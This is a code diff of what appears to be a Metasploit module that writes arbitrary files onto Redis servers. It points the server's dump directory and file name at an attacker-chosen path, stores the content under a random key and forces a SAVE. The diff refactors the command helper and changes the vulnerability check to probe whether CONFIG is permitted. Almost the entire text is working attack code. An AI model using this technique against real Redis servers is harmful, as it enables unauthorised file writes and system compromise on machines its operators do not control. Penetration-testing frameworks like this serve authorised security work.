@@ -57,15 +57,15 @@ class Metasploit3 < Msf::Auxiliary
     # Get the currently configured dir and dbfilename before we overwrite them;
     # we should set them back to their original values after we are done.
     # XXX: this is a hack -- we should really parse the responses more correctly
-    original_dir = send_redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
-    original_dbfilename = send_redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
+    original_dir = redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
+    original_dbfilename = redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last
 
     # set the directory which stores the current redis local store
-    data = send_redis_command('CONFIG', 'SET', 'dir', dirname)
+    data = redis_command('CONFIG', 'SET', 'dir', dirname)
     return unless data.include?('+OK')
 
     # set the file name, relative to the above directory name, that is the redis local store
-    data = send_redis_command('CONFIG', 'SET', 'dbfilename', basename)
+    data = redis_command('CONFIG', 'SET', 'dbfilename', basename)
     return unless data.include?('+OK')
 
     # set a key in this db that contains our content
@@ -73,33 +73,32 @@ class Metasploit3 < Msf::Auxiliary
     # multiline.  It also probably doesn't work well if the content isn't
     # simple ASCII text
     key = Rex::Text.rand_text_alpha(32)
-    data = send_redis_command('SET', key, content)
+    data = redis_command('SET', key, content)
     return unless data.include?('+OK')
-    data = send_redis_command('SAVE')
+    data = redis_command('SAVE')
     return unless data.include?('+OK')
     print_good("#{peer} -- saved file to #{path}")
 
     # cleanup
     # XXX: ensure that these get sent if we prematurely return if a previous command fails
-    send_redis_command('CONFIG', 'SET', 'dir', original_dir)
-    send_redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
-    send_redis_command('DEL', key)
-    send_redis_command('SAVE')
+    redis_command('CONFIG', 'SET', 'dir', original_dir)
+    redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
+    redis_command('DEL', key)
+    redis_command('SAVE')
   end
 
   def check
     connect
-    data = send_redis_command('INFO')
-    if data && /NOAUTH Authentication required/ =~ data
-      data = send_redis_command('INFO') if redis_auth?(datastore['Password'])
-    end
-    disconnect
-    if data && /redis_version:(?<redis_version>\S+)/ =~ data
+    # they are only vulnerable if we can run the CONFIG command, so try that
+    return Exploit::CheckCode::Safe unless (config_data = redis_command('CONFIG', 'GET', '*')) && config_data =~ /dbfilename/
+
+    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
       report_redis(redis_version)
-      Exploit::CheckCode::Vulnerable
-    else
-      Exploit::CheckCode::Safe
     end
+
+    Exploit::CheckCode::Vulnerable
+  ensure
+    disconnect
   end
 
   def setup
@@ -129,22 +128,11 @@ class Metasploit3 < Msf::Auxiliary
     fail_with(Failure::BadConfig, "RemoteFile must be set") unless datastore['RemoteFile']
     return unless check == Exploit::CheckCode::Vulnerable
 
-    connect
-    unless (res = send_redis_command('PING'))
-      vprint_error("#{peer} -- did not respond to our redis PING")
-      return
-    end
-
-    if res =~ /PONG/
-      vprint_good("#{peer} -- responded positively to our PONG")
+    begin
+      connect
       send_file(datastore['RemoteFile'], @upload_content)
-    elsif res =~ /NOAUTH Authentication required/ && redis_auth?(datastore['Password'])
-      vprint_good("#{peer} -- responded to auth successfully")
-      send_file(datastore['RemoteFile'], @upload_content)
-    else
-      vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
+    ensure
+      disconnect
     end
-  ensure
-    disconnect
   end
 end
